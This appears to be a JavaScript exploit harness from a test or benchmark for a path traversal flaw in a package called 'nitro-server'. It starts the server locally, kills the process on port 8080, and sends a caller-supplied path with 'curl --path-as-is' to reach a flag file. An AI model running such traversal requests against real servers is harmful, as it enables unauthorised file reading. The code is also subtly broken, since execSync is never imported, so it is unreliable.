function exploitFunction(payload) {
  const path = require("path");
  const pathToFlag = path.resolve(__dirname, "../flag.html");

  const pkg = require("nitro-server");
  const fs = require("fs");
  const { exec } = require("child_process");

  let hostsFile = fs.readFileSync(pathToFlag).toString();

  try {
    execSync("fuser -k 8080/tcp", () => {});
  } catch (e) {}

  pkg.start("");

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${payload}"`;

  return new Promise((resolve, reject) => {
    exec(attack_string, { timeout: 10000 }, (error, stdout) => { // Increase timeout to 10 seconds
      if (error) {
        reject(error);
      } else {
        resolve(stdout);
      }
    });
  });
}

module.exports = { exploitFunction };